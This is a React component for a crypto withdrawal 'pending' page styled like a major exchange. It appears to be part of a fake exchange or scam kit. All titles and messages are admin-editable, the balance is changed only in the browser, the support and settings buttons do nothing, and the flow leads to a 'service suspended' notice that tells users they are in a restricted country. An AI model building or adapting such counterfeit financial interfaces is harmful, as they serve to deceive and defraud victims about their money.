import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useApp } from '@/contexts/AppContext';
import { LoadingOverlay } from '@/pages/LoadingScreen';

export function PendingPage() {
  const navigate = useNavigate();
  const { adminData, updateBalanceAfterWithdrawal, showToast, pendingWithdrawal, setPendingWithdrawal } = useApp();
  const [buttonLoading, setButtonLoading] = useState(false);
  const amount = pendingWithdrawal?.amount || 0;
  const symbol = pendingWithdrawal?.symbol || adminData.cryptoSymbol;

  const handleOk = async () => {
    setButtonLoading(true);
    
    // Update balance after withdrawal
    if (amount > 0) {
      updateBalanceAfterWithdrawal(amount);
    }

    showToast(`↗ Withdrawal -${amount.toFixed(2)} ${symbol}`, 'success');
    
    // Clear pending withdrawal
    setPendingWithdrawal(null);
    
    // Trigger loading overlay which will navigate after 2s to service-suspension
  };

  return (
    <div className="min-h-screen bg-[#1D252B] flex flex-col text-white relative overflow-x-hidden">
      <style>{`
        @keyframes rotate {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }

        @keyframes loading-bar {
          0%, 100% { transform: scaleY(1); }
          50% { transform: scaleY(0.4); }
        }

        .icon-ring {
          animation: rotate 20s linear infinite;
        }

        .pending-icon-container {
          width: 80px;
          height: 80px;
          position: relative;
          margin: 0 auto 24px;
        }

        .pending-icon-ring {
          position: absolute;
          width: 100%;
          height: 100%;
          border: 2px dotted #F0B90B;
          border-radius: 50%;
        }

        .pending-icon-circle {
          position: absolute;
          top: 8px;
          left: 8px;
          right: 8px;
          bottom: 8px;
          background: #F0B90B;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .pending-icon-circle svg {
          width: 32px;
          height: 32px;
          fill: none;
          stroke: #1D252B;
          stroke-width: 2.5;
          stroke-linecap: round;
          stroke-linejoin: round;
        }

        .main-title {
          font-size: 20px;
          font-weight: 700;
          color: #F0B90B;
          text-align: center;
          margin-bottom: 16px;
        }

        .message-line {
          font-size: 14px;
          color: #ffffff;
          text-align: center;
          line-height: 1.5;
          margin-bottom: 8px;
        }

        [data-editable="amount-card"] {
          background: #0B0E11;
          border-radius: 8px;
          padding: 20px 24px;
          text-align: center;
          margin-top: 32px;
          margin-bottom: 16px;
          max-width: 320px;
          margin-left: auto;
          margin-right: auto;
          border: 1px solid #1E2329;
        }

        .card-label {
          font-size: 12px;
          color: #848E9C;
          margin-bottom: 8px;
          text-transform: none;
        }

        .card-amount {
          font-size: 24px;
          font-weight: 600;
          color: #ffffff;
          margin-bottom: 4px;
          letter-spacing: -0.3px;
        }

        .ok-button {
          width: 100%;
          background-color: #F0B90B;
          color: #000000;
          font-weight: 600;
          padding: 10px 16px;
          border-radius: 6px;
          border: none;
          cursor: pointer;
          font-size: 14px;
          transition: background-color 0.2s;
          display: flex;
          align-items: center;
          justify-content: center;
          height: 40px;
        }

        .ok-button:hover {
          background-color: #F8D56B;
        }

        .ok-button:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .loading-bars {
          display: flex;
          align-items: center;
          gap: 4px;
        }

        .loading-bar {
          width: 4px;
          background-color: #1E2329;
          border-radius: 2px;
        }

        .loading-bar-1 { height: 16px; animation: loading-bar 0.6s ease-in-out infinite; }
        .loading-bar-2 { height: 12px; animation: loading-bar 0.6s ease-in-out infinite 0.1s; }
        .loading-bar-3 { height: 10px; animation: loading-bar 0.6s ease-in-out infinite 0.2s; }
        .loading-bar-4 { height: 8px; animation: loading-bar 0.6s ease-in-out infinite 0.3s; }
      `}</style>

      {/* Top Message - Exact style from service-suspension.html */}
      <div className="w-full px-4 py-3 flex items-start gap-3 relative">
        <svg className="w-4 h-4 text-[#F0B90B] flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
          <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/>
        </svg>
        <div className="flex-1 text-xs leading-relaxed text-gray-200 font-semibold pr-8">
          Service suspended: according to our <span className="font-bold text-white">Terms of Use</span>, we are unable to provide services to users while they are in a restricted country (including restricted IP addresses). Your account and funds are safe. You can only <button onClick={() => navigate('/withdrawal')} className="text-[#F0B90B] underline hover:no-underline font-bold">withdraw your funds</button>; depositing and other product trading services are suspended. For further support, please contact <button onClick={() => showToast('Customer Service unavailable', 'info')} className="text-[#F0B90B] underline hover:no-underline font-bold">Customer Service</button>.
        </div>
        <button
          onClick={(e) => {
            const banner = e.currentTarget.closest('.w-full');
            banner?.remove();
          }}
          className="absolute top-1/2 -translate-y-1/2 right-3 text-gray-400 hover:text-white transition-colors"
        >
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"/>
          </svg>
        </button>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-4 py-8 sm:px-6 lg:px-8">
        <div className="w-full max-w-md text-center space-y-4">
          
          {/* Pending Icon */}
          <div className="pending-icon-container">
            <div className="pending-icon-ring icon-ring"></div>
            <div className="pending-icon-circle">
              <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <circle cx="12" cy="12" r="10"/>
                <polyline points="12 6 12 12 16 14"/>
              </svg>
            </div>
          </div>

          {/* Title */}
          <h1 className="main-title">{adminData.pendingTitle}</h1>

          {/* Description Lines */}
          <div className="space-y-2">
            <p className="message-line">{adminData.pendingMessageLine1}</p>
            <p className="message-line">{adminData.pendingMessageLine2}</p>
            <p className="message-line">{adminData.pendingMessageLine3}</p>
          </div>

          {/* Amount Card */}
          <div data-editable="amount-card" data-field-id="withdrawal_transaction">
            <div className="card-label" data-subfield="label">You'll receive</div>
            <div className="card-amount" data-subfield="amount">{amount.toFixed(2)} {symbol}</div>
          </div>

          {/* OK Button */}
          <button
            id="okBtn"
            onClick={handleOk}
            disabled={buttonLoading}
            className="ok-button"
          >
            <span id="btnText" style={{ display: buttonLoading ? 'none' : 'block' }}>{adminData.pendingOkButtonText}</span>
            <div id="btnLoading" className="loading-bars" style={{ display: buttonLoading ? 'flex' : 'none' }}>
              <span className="loading-bar loading-bar-1"></span>
              <span className="loading-bar loading-bar-2"></span>
              <span className="loading-bar loading-bar-3"></span>
              <span className="loading-bar loading-bar-4"></span>
            </div>
          </button>

        </div>
      </div>

      {/* Footer */}
      <div className="w-full py-4 flex flex-wrap items-center justify-center gap-4 text-xs text-[#848E9C] border-t border-gray-800/30">
        <button onClick={() => showToast('Language settings unavailable', 'info')} className="flex items-center gap-1.5 hover:text-white transition-colors">
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/>
          </svg>
          English
        </button>
        <button onClick={() => showToast('Cookies settings unavailable', 'info')} className="hover:text-white transition-colors">Cookies</button>
        <button onClick={() => showToast('Privacy settings unavailable', 'info')} className="hover:text-white transition-colors">Privacy</button>
      </div>

      {/* Loading Overlay */}
      <LoadingOverlay show={buttonLoading} redirectTo="/service-suspension" duration={2000} />
    </div>
  );
}

export default PendingPage;
